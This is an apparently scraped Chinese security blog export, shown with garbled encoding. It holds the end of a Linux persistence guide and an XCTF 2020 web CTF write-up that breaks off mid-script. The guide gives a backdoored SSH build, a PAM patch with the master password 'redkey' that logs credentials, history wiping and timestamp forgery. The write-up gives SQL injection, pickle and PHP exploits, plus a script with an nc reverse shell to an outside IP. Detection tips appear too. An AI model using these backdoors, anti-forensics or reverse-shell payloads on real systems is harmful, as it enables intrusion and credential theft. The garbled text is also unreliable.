--prefix&#x3D;&#x2F;usr --sysconfdir&#x3D;&#x2F;etc&#x2F;ssh --with-pam --with-kerberos5make cleanmake &amp;&amp; make installservice sshd restartfã€å¯¹æ¯”åŸæ¥çš„é…ç½®æ–‡ä»¶ï¼Œä½¿é…ç½®æ–‡ä»¶ä¸€è‡´ï¼Œç„¶åä¿®æ”¹æ–‡ä»¶æ—¥æœŸã€‚touch -r &#x2F;etc&#x2F;ssh&#x2F;ssh_config.old &#x2F;etc&#x2F;ssh&#x2F;ssh_configtouch -r &#x2F;etc&#x2F;ssh&#x2F;sshd_config.old &#x2F;etc&#x2F;ssh&#x2F;sshd_configgã€æ¸…é™¤æ“ä½œè®°å½•export HISTFILE&#x3D;&#x2F;dev&#x2F;nullexport HISTSIZE&#x3D;0echo &gt;&#x2F;root&#x2F;.bash_history &#x2F;&#x2F;æ¸…ç©ºæ“ä½œæ—¥å¿— ä¿®æ”¹æ—¥å¿—è¾“å‡ºå’Œå¯†ç  ä¿®æ”¹version æˆåŠŸï¼Œilogä¸­è®°å½•äº†æœ¬æœºç™»å½•çš„è´¦å·å¯†ç ï¼Œologä¸­è®°å½•äº†æœ¬æœºç™»å½•å…¶ä»–æœºå™¨çš„æ˜æ–‡å¯†ç  æ’æŸ¥æŠ€å·§ åˆ©ç”¨straceæ‰¾å‡ºsshåé—¨ 123456# 1ã€è·å–å¯ç–‘è¿›ç¨‹PIps aux | grep sshd# 2ã€è·Ÿè¸ªsshd PIDstrace -o aa -ff -p PID# 3ã€æŸ¥çœ‹è®°å½•å¯†ç æ‰“å¼€æ–‡ä»¶grep open sshd* | grep -v -e No -e null -e denied| grep WR 9ã€PAMåé—¨PAM ï¼ˆPluggable Authentication Modules ï¼‰æ˜¯ç”±Sunæå‡ºçš„ä¸€ç§è®¤è¯æœºåˆ¶ã€‚å®ƒé€šè¿‡æä¾›ä¸€äº›åŠ¨æ€é“¾æ¥åº“å’Œä¸€å¥—ç»Ÿä¸€çš„APIï¼Œå°†ç³»ç»Ÿæä¾›çš„æœåŠ¡å’Œè¯¥æœåŠ¡çš„è®¤è¯æ–¹å¼åˆ†å¼€ï¼Œä½¿å¾—ç³»ç»Ÿç®¡ç†å‘˜å¯ä»¥çµæ´»åœ°æ ¹æ®éœ€è¦ç»™ä¸åŒçš„æœåŠ¡é…ç½®ä¸åŒçš„è®¤è¯æ–¹å¼è€Œæ— éœ€æ›´æ”¹æœåŠ¡ç¨‹åºï¼ŒåŒæ—¶ä¹Ÿä¾¿äºå‘ç³»ç»Ÿä¸­æ·»åŠ æ–°çš„è®¤è¯æ‰‹æ®µã€‚PAMæœ€åˆæ˜¯é›†æˆåœ¨Solarisä¸­ï¼Œç›®å‰å·²ç§»æ¤åˆ°å…¶å®ƒç³»ç»Ÿä¸­ï¼Œå¦‚Linuxã€SunOSã€HP-UX 9.0ç­‰ã€‚ åˆ©ç”¨æ–¹æ³•: 12341ã€è·å–ç›®æ ‡ç³»ç»Ÿæ‰€ä½¿ç”¨çš„PAMç‰ˆæœ¬ï¼Œä¸‹è½½å¯¹åº”ç‰ˆæœ¬çš„pamç‰ˆæœ¬2ã€è§£å‹ç¼©ï¼Œä¿®æ”¹pam_unix_auth.cæ–‡ä»¶ï¼Œæ·»åŠ ä¸‡èƒ½å¯†ç 3ã€ç¼–è¯‘å®‰è£…PAM4ã€ç¼–è¯‘å®Œåçš„æ–‡ä»¶åœ¨ï¼šmodules&#x2F;pam_unix&#x2F;.libs&#x2F;pam_unix.soï¼Œå¤åˆ¶åˆ°&#x2F;lib64&#x2F;securityä¸­è¿›è¡Œæ›¿æ¢ï¼Œå³å¯ä½¿ç”¨ä¸‡èƒ½å¯†ç ç™»é™†ï¼Œå¹¶å°†ç”¨æˆ·åå¯†ç è®°å½•åˆ°æ–‡ä»¶ä¸­ã€‚ 1rpm -qa | grep pam http://www.linux-pam.org/library/ 1234tar -xvf Linux-PAM-1.1.8.tar.gzcd Linux-PAM-1.1.8cd modules&#x2F;pam_unix&#x2F;vi pam_unix_auth.c 106è¡Œæ·»åŠ FILE *fp; åœ¨177è¡Œæ·»åŠ  12345678910111213141516&#x2F;*password:&quot;redkey&quot;*&#x2F;if(strcmp(p,&quot;redkey&quot;)&#x3D;&#x3D;0)&#123; retval &#x3D; PAM_SUCCESS;&#125;if(retval&#x3D;&#x3D; PAM_SUCCESS)&#123;&#x2F;*pamfile:pamwd.txt*&#x2F; fp&#x3D;fopen(&quot;pamwd.txt&quot;,&quot;a&quot;); fprintf(fp,&quot;%s::%s\\n&quot;,name,p); fclose(fp);&#125; name &#x3D; p &#x3D; NULL; AUTH_RETURN;&#125; ç¼–è¯‘ 123cd ..&#x2F;..&#x2F;.&#x2F;configuremake ä¼šæ ¹æ®ä¸åŒæƒ…å†µè°ƒç”¨pam_unix.so å¤‡ä»½åŸæœ‰PAMæ¨¡å— 12find &#x2F; -name pam_unix.so&#x2F;usr&#x2F;lib64&#x2F;security&#x2F;pam_unix.so 12cd &#x2F;usr&#x2F;lib64&#x2F;security&#x2F;pam_unix.somv pam_unix.so&#123;,.bak&#125; å¤åˆ¶æ–°PAMæ¨¡å—åˆ°/usr/lib64/security/ç›®å½•ä¸‹ï¼š 1cp &#x2F;root&#x2F;Linux-PAM-1.1.8&#x2F;modules&#x2F;pam_unix&#x2F;.libs&#x2F;pam_unix.so &#x2F;usr&#x2F;lib64&#x2F;security&#x2F; ä¿®æ”¹pamæ¨¡å—æ—¶é—´å±æ€§ 1touch -t 201804111122 pam_unix.so å‰é¢éƒ½æ²¡é—®é¢˜ï¼Œä½†æ˜¯æœ€åè¿æ¥ä¸ä¸Šã€‚ã€‚ã€‚ æ’æŸ¥æŠ€å·§ 1234567# 1ã€é€šè¿‡Straceè·Ÿè¸ªsshps axu | grep sshdstrace -o aa -ff -p PIDgrep open aa* | grep -v -e No -e null -e denied| grep WR# 2ã€æ£€æŸ¥pam_unix.soçš„ä¿®æ”¹æ—¶é—´stat &#x2F;lib&#x2F;security&#x2F;pam_unix.so #32ä½stat &#x2F;lib64&#x2F;security&#x2F;pam_unix.so #64ä½ 10ã€rookitåé—¨ Mafixæ˜¯ä¸€æ¬¾å¸¸ç”¨çš„è½»é‡åº”ç”¨çº§åˆ«Rootkitsï¼Œæ˜¯é€šè¿‡ä¼ªé€ sshåè®®æ¼æ´å®ç°è¿œç¨‹ç™»é™†çš„ç‰¹ç‚¹æ˜¯é…ç½®ç®€å•å¹¶å¯ä»¥è‡ªå®šä¹‰éªŒè¯å¯†ç å’Œç«¯å£å·ã€‚ åˆ©ç”¨æ–¹æ³•ï¼šå®‰è£…å®Œæˆåï¼Œä½¿ç”¨ssh ç”¨æˆ·@IP -P é…ç½®çš„ç«¯å£ï¼Œå³å¯è¿œç¨‹ç™»å½•ã€‚ æˆ‘æœ¬åœ°æµ‹è¯•äº†ä¸‹ï¼Œç›´æ¥æŠ¥é”™äº†ï¼Œ 64ä½ç³»ç»Ÿä¸­å®‰è£…äº†32ä½ç¨‹åºè§£å†³åŠæ³• æ˜¯å› ä¸º64ä½ç³»ç»Ÿä¸­å®‰è£…äº†32ä½ç¨‹åº è§£å†³æ–¹æ³•ï¼š ä»£ç å¦‚ä¸‹ å¤åˆ¶ä»£ç  yum install glibc.i686 é—®é¢˜äºŒï¼Œè§£å†³äº¤å‰ç¼–è¯‘ç¯å¢ƒé”™è¯¯ # 1yum install glibc.i686 centos6èµ·/etc/syslog.confä¸å†æœ‰ï¼è€Œæ˜¯/etc/rsyslog.confä»£æ›¿ï¼ ä»ç„¶æœ‰å‡ ä¸ªé”™è¯¯æ— æ³•è§£å†³ï¼Œä½†æ˜¯ç½‘ä¸Šæµä¼ çš„å¤§å¤šæ˜¯è¿™ä¸ªç‰ˆæœ¬ã€‚ã€‚ å…³äºrookitéœ€è¦ç»§ç»­æ¢ç´¢ã€‚ å‚è€ƒé“¾æ¥ https://mp.weixin.qq.com/s?__biz=MzA3NzE2MjgwMg==&amp;mid=2448904990&amp;idx=1&amp;sn=9d5ed78f2d760540e4a40e5e9bb29048&amp;chksm=8b55c343bc224a55998647ff96c8e96a81fa128f2d32c6d95e0e83e1cde1a5b996612b52333a&amp;scene=126&amp;sessionid=1583909254&amp;key=8eee0b50946f7fa18c094b8a6874c7b06957421cd93368879b6f05c195994e2fd058437935c4fc42c9c748d7f973843bc7ac101fc59b6016f6d14860397b7d6d10e0dd011612fd7cb274951496f98813&amp;ascene=1&amp;uin=NzY4MzU5NDcy&amp;devicetype=Windows+10&amp;version=62080074&amp;lang=zh_CN&amp;exportkey=AR76JlF7ukKA%2B%2FrHmZNLPg4%3D&amp;pass_ticket=DQ6PMsSqx8syDl1t9nL1Y2s5T9VMq8kFaoEXTwcSMOZoXARa3QjAHcL6ZTfCpZ63 https://blog.51cto.com/huangzp/1911767 https://www.cnblogs.com/beautiful-code/p/9441757.html","categories":[],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://glotozz.github.io/tags/Linux/"}]},{"title":"XCTFé«˜æ ¡æˆ˜â€œç–«â€ç½‘ç»œå®‰å…¨åˆ†äº«èµ›","slug":"é«˜æ ¡æˆ˜â€œç–«â€ç½‘ç»œå®‰å…¨åˆ†äº«èµ›","date":"2020-03-08T12:02:35.000Z","updated":"2020-04-19T08:25:15.694Z","comments":true,"path":"2020/03/08/é«˜æ ¡æˆ˜â€œç–«â€ç½‘ç»œå®‰å…¨åˆ†äº«èµ›/","link":"","permalink":"https://glotozz.github.io/2020/03/08/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B/","excerpt":"","text":"&nbsp; &nbsp; &nbsp;&nbsp;&nbsp;ç®€é™‹çš„ç›®å½• sqlcheckin webtmp fmkq nweb UAF-PHP webct easy_trick_gzmtu hackme GuessGame NothardWeb dooog baby_java happyvacation hardphp easyweb æ€»ç»“ï¼š å‚è€ƒé“¾æ¥ sqlcheckinä»£ç æ²¡æœ‰è¿›è¡Œè½¬ä¹‰ï¼Œè¿‡æ»¤äº†å¾ˆå¤šï¼Œä¸‹é¢çš„ä¸‡èƒ½å¯†ç å¯ä»¥ 1234admin&#39;-0-&#39;1&#39;-&#39;1&#39;&amp;&#39;1 é™¤äº†å¼€å¤´æ˜¯éé›¶æ•°çš„å­—ç¬¦ä¸²ï¼Œå…¶ä»–å­—ç¬¦ä¸²åŒ–æˆæ•´æ•°éƒ½ä¸º0ï¼Œå­—ç¬¦ä¸²=0ä¸ºçœŸï¼Œå½“æ‰€æœ‰usernameé‡Œæ²¡æœ‰å¼€å¤´æ˜¯0çš„å­—ç¬¦ä¸²ï¼Œusername=0ç›¸å½“äºæŸ¥å…¨éƒ¨æ•°æ® webtmpè¿‡æ»¤äº†R ä»é›¶å¼€å§‹pythonååºåˆ—åŒ–æ”»å‡»ï¼špickleåŸç†è§£æ &amp; ä¸ç”¨reduceçš„RCEå§¿åŠ¿ ä¸€å¼€å§‹è€ƒè™‘RCE 1b&#39;\\x80\\x03c__main__\\nAnimal\\n)\\x81&#125;(V__setstate__\\ncos\\nsystem\\nubVls &#x2F;\\nb0c__main__\\nAnimal\\n)\\x81&#125;(X\\x04\\x00\\x00\\x00nameq\\x03X\\x14\\x00\\x00\\x00\\xe4\\xb8\\x80\\xe7\\xbb\\x99\\xe6\\x88\\x91\\xe5\\x93\\xa9giaogiaoq\\x04X\\x08\\x00\\x00\\x00categoryq\\x05X\\x04\\x00\\x00\\x00Giaoq\\x06ub.&#39; æç¤ºglobal XXï¼Œåº”è¯¥æ˜¯å› ä¸ºraise pickle.UnpicklingError(&quot;global &#39;%s.%s&#39; is forbidden&quot; % (module, name))ï¼Œåæ¥è€ƒè™‘æ”¹å†™secretå¯¹è±¡ secret.py 1secret &#x3D; &#123;&#39;name&#39;:&#39;xx&#39;,&#39;category&#39;:&#39;yy&#39;&#125; exp.py 12345678910import pickleimport pickletoolsimport secretclass Animal: def __init__(self): self.name = 'aa' self.category = 'bb's = b'\\x80\\x03c__main__\\nsecret\\n&#125;(Vname\\nVaa\\nVcategory\\nVbb\\nub0c__main__\\nAnimal\\n)\\x81&#125;(X\\x04\\x00\\x00\\x00nameX\\x02\\x00\\x00\\x00aaX\\x08\\x00\\x00\\x00categoryX\\x02\\x00\\x00\\x00bbub.'l = pickle.loads(s)pickletools.dis(s) base64ç¼–ç å³å¯ fmkqç»•è¿‡headï¼š \\ ç»•è¿‡formatï¼š %1$s 8080ç«¯å£apiï¼Œè€ƒè™‘ssrf å°è¯•äº†å„ç§payloadï¼š 1127.0.0.1:8080&#x2F;read&#x2F;file&#x3D;&#x2F;tmp&#x2F;..&#x2F;*&#x2F;flag%26vipcode&#x3D;0 æœ€åé˜Ÿé‡Œä¸€ä¸ªå¸ˆå‚…æåˆ°äº†vipcode {file.vip.__dict__} ä¹‹åè™½ç„¶æ‰¾åˆ°äº†flagè·¯å¾„ï¼Œä½†æ˜¯æç¤ºnononoï¼Œéœ€è¦è¯»å–æºç  /app/app.py 1234567891011121314151617181920212223242526272829303132333435363738import webfrom urllib.parse import unquotefrom base.readfile import *urls = ( '/', 'help', '/read/(.*)','read')web.config.debug = Falseclass help: def GET(self): help_information = ''' Welcome to our FMKQ api, you could use the help information below To read file: /read/file=example&amp;vipcode=example if you are not vip,let vipcode=0,and you can only read /tmp/&#123;file&#125; Other functions only for the vip!!! ''' return help_informationclass read: def GET(self,text): file2read = readfile(text) if file2read.test() == False: return \"error\" else: if file2read.isvip() == False: return (\"The content of \"+ file2read.GetFileName() +\" is &#123;file&#125;\").format(file=file2read) else: vipfile2read = vipreadfile(file2read) return (str(vipfile2read))if __name__ == \"__main__\": app = web.application(urls, globals()) app.run() /app/base/vip.pyå°±æ˜¯éªŒè¯ç çš„ /app/base/readfile.py 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394from .vip import vipimport reimport osclass File: def __init__(self,file): self.file = file def __str__(self): return self.file def GetName(self): return self.fileclass readfile(): def __str__(self): filename = self.GetFileName() if '..' in filename or 'proc' in filename: return \"quanbumuda\" else: try: file = open(\"/tmp/\" + filename, 'r') content = file.read() file.close() return content except: return \"error\" def __init__(self, data): if re.match(r'file=.*?&amp;vipcode=.*?',data) != None: data = data.split('&amp;') data = &#123; data[0].split('=')[0]: data[0].split('=')[1], data[1].split('=')[0]: data[1].split('=')[1] &#125; if 'file' in data.keys(): self.file = File(data['file']) if 'vipcode' in data.keys(): self.vipcode = data['vipcode'] self.vip = vip() def test(self): if 'file' not in dir(self) or 'vipcode' not in dir(self) or 'vip' not in dir(self): return False else: return True def isvip(self): if self.vipcode == self.vip.GetCode(): return True else: return False def GetFileName(self): return self.file.GetName()current_folder_file = []class vipreadfile(): def __init__(self,readfile): self.filename = readfile.GetFileName() self.path = os.path.dirname(os.path.abspath(self.filename)) self.file = File(os.path.basename(os.path.abspath(self.filename))) global current_folder_file try: current_folder_file = os.listdir(self.path) except: current_folder_file = current_folder_file def __str__(self): if 'fl4g' in self.path: return 'nonono,this folder is a secret!!!' else: output = '''Welcome,dear vip! Here are what you want:\\r\\nThe file you read is:\\r\\n''' filepath = (self.path + '/&#123;vipfile&#125;').format(vipfile=self.file) output += filepath output += '\\r\\n\\r\\nThe content is:\\r\\n' try: f = open(filepath,'r') content = f.read() f.close() except: content = 'can\\'t read' output += content output += '\\r\\n\\r\\nOther files under the same folder:\\r\\n' output += ' '.join(current_folder_file) return output éœ€è¦ç»•è¿‡é»‘åå• 12if &#39;fl4g&#39; in self.path: return &#39;nonono,this folder is a secret!!!&#39; æˆ‘ä»¬ä¼ å…¥çš„æ˜¯readfile 12345678def GetName(self): return self.filedef GetFileName(self): return self.file.GetName()self.filename = readfile.GetFileName()self.path = os.path.dirname(os.path.abspath(self.filename))filepath = (self.path + '/&#123;vipfile&#125;').format(vipfile=self.file) åˆ†æä¸‹æ±ªæ±ªæ±ªå¸ˆå‚…çš„payload http://127.0.0.1:8080/read/file=/{vipfile.file[0]}l4g_1s_h3re_u_wi11_rua/flag æœ¬åœ°æ­å»ºä¸‹ 123filepath &#x3D; (&#39;C:\\\\&#123;vipfile.file[0]&#125;l4g_1s_h3re_u_wi11_rua&#x2F;&#123;vipfile&#125;&#39;).format(vipfile&#x3D;self.file)&#x3D;&gt;filepath &#x3D; (&#39;C:\\\\fl4g_1s_h3re_u_wi11_rua&#39; + &#39;&#x2F;flag&#39;) format()æ˜¯å¯ä»¥ä¼ å…¥å¯¹è±¡çš„ï¼Œè¿™é‡Œä¼ å…¥çš„self.fileæ˜¯fileå¯¹è±¡ï¼Œfile.fileæ˜¯{str}&#39;flag&#39;ï¼Œå› æ­¤vipfile.file[0]å°±æ˜¯fï¼Œè‡³äº{vipfile}ï¼Œå°±æ˜¯def __str__(self):è¿”å›çš„å­—ç¬¦ä¸² æœ€åä¸¾ä¸ªç®€å•çš„ä¾‹å­ ==================åˆ†å‰²çº¿ è¡¥å……ä¸‹å‰é¢sstiçš„æ¢æµ‹è¿‡ç¨‹ï¼Œå½“æ—¶ä¸çŸ¥é“ä¸ºå•¥æ²¡æµ‹å‡ºæ¥ 1&#123;file.__class__&#125; 1&#123;file.__class__.__init__.__globals__&#125; å‘ç°fileä¸‹æœ‰ä¸ªvip 1&#123;file.vip.class.init.globals&#125; nwebæ ¹æ®htmlæç¤º110ï¼Œä¿®æ”¹typeï¼ŒæˆåŠŸæ³¨å†Œ ä¹‹åæ˜¯sqlæ³¨å…¥ï¼ŒæŠ¥500ï¼ŒçŒœæµ‹æ˜¯æ›¿æ¢ä¸ºç©ºï¼ŒåŒå†™ç»•è¿‡ï¼Œå¾—åˆ°ä¸€åŠflag æç¤ºRogue-MySql-Serverï¼Œç»™äº†è´¦å·å¯†ç ï¼Œç™»å½•adminå‘ç°å¯ä»¥mysqlæ¶æ„æœåŠ¡ç«¯è¯»å– UAF-PHPPHP7.4ï¼Œä½†æ˜¯æœªå¼€å¯FFI 1apache_child_terminate,apache_setenv,chgrp,chmod,chown,curl_exec,curl_multi_exec,dl,exec,imap_mail,imap_open,ini_alter,ini_restore,ini_set,link,mail,openlog,parse_ini_file,passthru,pcntl_alarm,pcntl_exec,pcntl_fork,pcntl_setpriority,pcntl_signal,pcntl_signal_dispatch,pcntl_sigprocmask,pcntl_sigtimedwait,pcntl_sigwaitinfo,pcntl_wait,pcntl_waitpid,pcntl_wstopsig,pcntl_wtermsig,popen,posix_kill,proc_get_status,proc_open,proc_terminate,putenv,readlink,shell_exec,symlink,syslog,system 1open_basedir &#x2F;var&#x2F;www&#x2F;html:&#x2F;tmp ç”¨è¿™ä¸ªphp7.0-7.4çš„exp https://raw.githubusercontent.com/mm0r1/exploits/master/php7-backtrace-bypass/exploit.php?tdsourcetag=s_pctim_aiomsg æ²™ç®±æœ‰ç‚¹é—®é¢˜ï¼Œæœ€åæ”¾tmpç›®å½•ä¸‹å†åŒ…å«æ‰æˆåŠŸ webctä¸Šä¼ phar.gifï¼Œåˆ©ç”¨mysqlæœåŠ¡ç«¯æ¶æ„è¯»å–æ–‡ä»¶è§¦å‘phar:// è®°å½•ä¸€ä¸ªå°å‘ï¼ŒPHPçš„é…ç½®ä¸€èˆ¬æ˜¯å¸¸é‡ï¼Œå› æ­¤å¯ä»¥æ‰“å°ä¸‹ä»è€Œè§£å†³ç›´æ¥ä¼ MYSQLI_OPT_LOCAL_INFILEä¼ è¾“åå˜å­—ç¬¦ä¸²çš„é—®é¢˜ 12345678&lt;?php $m = new mysqli('117.78.1.xxx','root','root'); if($m-&gt;connect_error)&#123; die($m-&gt;connect_error); &#125; var_dump(MYSQLI_OPT_LOCAL_INFILE); $m-&gt;options(MYSQLI_OPT_LOCAL_INFILE,1); $result=$m-&gt;query('select 1;'); optionä¼ 8å³å¯ easy_trick_gzmtuæ¯ä¸ªå­—æ¯å‰æ·»åŠ \\å³å¯ï¼ŒæˆåŠŸå¾—åˆ° urlï¼š /eGlhb2xldW5n usernameï¼š admin passwordï¼š 20200202goodluck ç™»å½•åå­˜åœ¨æ–‡ä»¶è¯»å–ï¼Œç»•è¿‡æœ¬åœ° 1url&#x3D;file:&#x2F;&#x2F;localhost&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php index.php 123456789&lt;?phpinclude('conn.php');error_reporting(0);$time = date($_GET['time']);$sql = \"select * from `content` where `createtime` = '$time' \";$r = $conn-&gt;query($sql);$content = $r-&gt;fetch_array(MYSQL_ASSOC);?&gt; https://www.php.net/manual/zh/function.date.php åœ¨æ ¼å¼å­—ä¸²ä¸­çš„å­—ç¬¦å‰åŠ ä¸Šåæ–œçº¿æ¥è½¬ä¹‰å¯ä»¥é¿å…å®ƒè¢«æŒ‰ç…§ä¸Šè¡¨è§£é‡Šã€‚ eGlhb2xldW5n/check.php 123456789101112131415161718&lt;?phpinclude(\"../conn.php\");if(empty($_SESSION['login']))&#123; die('è¯·ç™»å½•!');&#125;if(isset($_GET['url']))&#123;$url = $_GET['url'];$parts = parse_url($url);if(empty($parts['host']) || $parts['host'] != 'localhost') &#123; die('è¯·ä»æœ¬åœ°è®¿é—®');&#125; if(!preg_match(\"/flag|fl|la|ag|fla|lag|log/is\", $parts['path']))&#123; readfile($url); &#125;else&#123; die('ä¸è¦æè¿™äº›å¥‡å¥‡æ€ªæ€ªçš„ä¸œè¥¿ã€‚'); &#125;&#125; è¿™é‡Œæ˜¯$parts = parse_url($url); https://www.php.net/manual/zh/function.parse-url.php /eGlhb2xldW5n/eGlhb2xldW5nLnBocA==.php 123456789101112131415161718192021222324252627282930313233343536373839404142&lt;?phpclass trick&#123; public $gf; public function content_to_file($content)&#123; $passwd = $_GET['pass']; if(preg_match('/^[a-z]+\\.passwd$/m',$passwd)) &#123; if(strpos($passwd,\"20200202\"))&#123; echo file_get_contents(\"/\".$content); &#125; &#125; &#125; public function aiisc_to_chr($number)&#123; if(strlen($number)&gt;2)&#123; $str = \"\"; $number = str_split($number,2); foreach ($number as $num ) &#123; $str = $str .chr($num); &#125; return strtolower($str); &#125; return chr($number); &#125; public function calc()&#123; $gf=$this-&gt;gf; if(!preg_match('/[a-zA-z0-9]|\\&amp;|\\^|#|\\$|%/', $gf))&#123; eval('$content='.$gf.';'); $content = $this-&gt;aiisc_to_chr($content); return $content; &#125; &#125; public function __destruct()&#123; $this-&gt;content_to_file($this-&gt;calc()); &#125; &#125;unserialize((base64_decode($_GET['code'])));?&gt; ç»•è¿‡æ­£åˆ™ç”¨%0aï¼Œä¸¤ä½çš„é™åˆ¶ï¼Œå®ƒæœ€åæœ‰ä¸ªtolowercase()ï¼Œå¯ä»¥ç”¨å¤§å†™ç»•è¿‡ï¼Œ å­—æ¯çš„è¿‡æ»¤ï¼Œåˆ©ç”¨å–åæ“ä½œ 12345a = 'FLAG'res = ''for i in a: res += str(ord(i))print(res) 123456789101112&lt;?phpclass trick&#123; public $gf;&#125;$s = \"70766571\";$s = urlencode(~$s);$a = new trick();$a-&gt;gf = urldecode('~'.$s);echo base64_encode(serialize($a));//å¦ä¸€ç§å†™æ³•//$a = new trick();//$a-&gt;gf = '~'.(~'70766571'); 1Tzo1OiJ0cmljayI6MTp7czoyOiJnZiI7czo5OiJ+yM&#x2F;IycnKyM4iO30&#x3D; urlç¼–ç ä¸‹å³å¯ =================================åˆ†å‰²çº¿ ä¸Šé¢æ˜¯åšè¿‡çš„ =================================åˆ†å‰²çº¿ hackme session.serialize_handlerè¯¯ç”¨å¯¼è‡´çš„ååºåˆ—åŒ–é—®é¢˜ï¼š https://www.cnblogs.com/sijidou/p/10455646.html ç»•è¿‡ä»£ç ä¸­ç»™å‡ºçš„é™åˆ¶å‚è€ƒbytectfåŸé¢˜ï¼šå››å­—ç¬¦å†™shellå†™shellåcat /flag 1compress.zlib:&#x2F;&#x2F;data:@127.0.0.1&#x2F;baidu.com?,ls GuessGame1234567if(config.enableReg &amp;&amp; noDos(regExp) &amp;&amp; flag.match(regExp))&#123; //res.end(flag); //Stop your wishful thinking and go away!&#125;if(req.query.q === flag) result+=flag;res.end(result); åŸå‹é“¾æ±¡æŸ“ 1&#123;\"user\":&#123;\"username\":\"admÄ±n888\",\"__proto__\": &#123;\"enableReg\": True&#125;&#125;&#125;) 50è¡Œä½¿ç”¨regExpæ¥åŒ¹é…flagï¼ŒregExpå¯æ§ï¼Œå› æ­¤å¯ä»¥æ„é€ ç‰¹æ®Šè¡¨è¾¾å¼æ§åˆ¶åŒ¹é…æ—¶é—´ å‡è®¾flagä¸ºï¼šflag{klasdfjasfasdfadffsdfas} æ„é€ var reg = /^flag{(((([a-zA-Z0-9]+)+)+)+)+1$/ åŒ¹é…çš„æ—¶é—´ä¼šç›¸å½“é•¿ å†æ„é€ var reg = /^flag{a(((([a-zA-Z0-9]+)+)+)+)+1$/åŒ¹é…æ—¶é—´ä¼šå¾ˆçŸ­ï¼ˆåŒ¹é…åˆ°k!=aä¼šç›´æ¥ç»“æŸï¼‰å› æ­¤å¯ä»¥é€šè¿‡åŒ¹é…æ—¶é—´æ¥åˆ¤æ–­flagï¼Œä½†æ˜¯è¿˜æ²¡å¤ªæƒ³å¥½ ç§˜ç¬ˆï¼æ‰‹å·¥ç›²æ³¨ï¼ ====================åˆ†å‰²çº¿ emmè‡ªå·±æœ¬åœ°æ­äº†ä¸ª 12345678910111213141516171819var express = require('express');var app = express();var flag = \"flag&#123;klasdfjasfasdfadffsdfas&#125;\";app.get('/', function (req, res) &#123; let regExp = req.query.q; console.log(regExp); console.log(flag); if(flag.match(regExp))&#123; &#125; res.send('ok');&#125;)var server = app.listen(8081, function () &#123; var host = server.address().address var port = server.address().port console.log(\"åº”ç”¨å®ä¾‹ï¼Œè®¿é—®åœ°å€ä¸º http://%s:%s\", host, port)&#125;) ä¸‹é¢çš„payloadæµ‹è¯•æˆåŠŸ 1^(?&#x3D;xx)(.*)*aaaaa$ &#x2F;&#x2F;xxxåŒ¹é…ä¸Šä¼šå»¶æ—¶ï¼Œå¹¶ä¸”ç»“å°¾ä¸èƒ½æ˜¯aaaaa =================åˆ†å‰²çº¿ çœ‹äº†vnçš„wpï¼Œç›´æ¥rceï¼Œå½“æ—¶ä¹Ÿæœ‰ç‚¹ç–‘é—®ï¼Œè¢«æ±¡æŸ“çš„å‚æ•°æ˜æ˜ä¼šè§¦å‘ï¼Œä¸ºå•¥ä¸èƒ½rceã€‚ã€‚ã€‚ v&amp;nçš„è„šæœ¬ 123456789101112import requeststheips = [\"http://121.37.179.47:8081/\",\"http://121.37.167.12:80\",\"http://121.37.167.12:81\",\"http://121.37.167.12:82\"]proxies=&#123;\"http\":\"http://localhost:4476\"&#125;while 1: for i in theips: try: requests.post(i,json=&#123;\"user\":&#123;\"username\":\"admIn888\",\"__proto__\":&#123;\"enableReg\":True,\"outputFunctionName\":\"_tmp1;global.process.mainModule.require('child_process').exec('rm /tmp/fa;mkfifo /tmp/fa;cat /tmp/fa|/bin/sh -i 2&gt;&amp;1|nc 106.14.15.50 1234 &gt; /tmp/fa ');var __tmp2\"&#125;&#125;&#125;,timeout=1,proxies=proxies) requests.get(i,timeout=1,proxies=proxies) except: pass NothardWebcbcå­—èŠ‚ç¿»è½¬æ”»å‡»ï¼Œå¯¹äºå·²çŸ¥æ˜æ–‡å’Œå¯†æ–‡ï¼Œå³å¯æ„é€ æˆ‘ä»¬éœ€è¦çš„æ˜æ–‡å¯¹åº”çš„å¯†æ–‡ åˆ†ææ˜æ–‡å’Œå¯†æ–‡ï¼Œå› ä¸ºæ˜¯æ˜æ–‡æœ€åéœ€è¦ååºåˆ—åŒ–ï¼Œå› æ­¤cbcå­—èŠ‚ç¿»è½¬æ”»å‡»éœ€è¦ivï¼Œæ€è·¯æ˜¯åˆ©ç”¨cbcé€‰æ‹©å¯†æ–‡æ”»å‡»å¾—åˆ°ivï¼Œä½†æ˜¯å¥½åƒåˆä¸è¡Œï¼Œä¼¼ä¹éœ€è¦æ§åˆ¶ä»»æ„æ˜æ–‡æ‰è¡Œ ================åˆ†å‰²çº¿ å› ä¸ºkeyç”Ÿæˆçš„æ–¹å¼strval(mt_rand() &amp; 0x5f5e0ff)ï¼Œ 0x5f5e0ff = 0b101111101011110000011111111ï¼Œ19ä¸ª1æœ‰54wå¤šç§æƒ…å†µï¼Œå¸¦å…¥è§£ç å¦‚æœæ­£ç¡®è§£ç è¯´æ˜keyæ˜¯æ­£ç¡®çš„ de1taçš„è„šæœ¬ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556&lt;?php$cccc=\"%d0%d%d%d%d%d0%d0%d%d%d%d00000%d%d%d%d%d%d%d%d\";for ($a=0; $a &lt; 2; $a++) &#123; for ($b=0; $b &lt; 2; $b++) &#123; for ($c=0; $c &lt; 2; $c++) &#123; for ($d=0; $d &lt; 2; $d++) &#123; for ($e=0; $e &lt; 2; $e++) &#123; for ($f=0; $f &lt; 2; $f++) &#123; for ($g=0; $g &lt; 2; $g++) &#123; for ($h=0; $h &lt; 2; $h++) &#123; for ($i=0; $i &lt; 2; $i++) &#123; for ($j=0; $j &lt; 2; $j++) &#123; for ($k=0; $k &lt; 2; $k++) &#123; for ($l=0; $l &lt; 2; $l++) &#123; for ($m=0; $m &lt; 2; $m++) &#123; for ($n=0; $n &lt; 2; $n++) &#123; for ($o=0; $o &lt; 2; $o++) &#123; for ($p=0; $p &lt; 2; $p++) &#123; for ($q=0; $q &lt; 2; $q++) &#123; for ($r=0; $r &lt; 2; $r++) &#123; for ($s=0; $s &lt; 2; $s++) &#123; 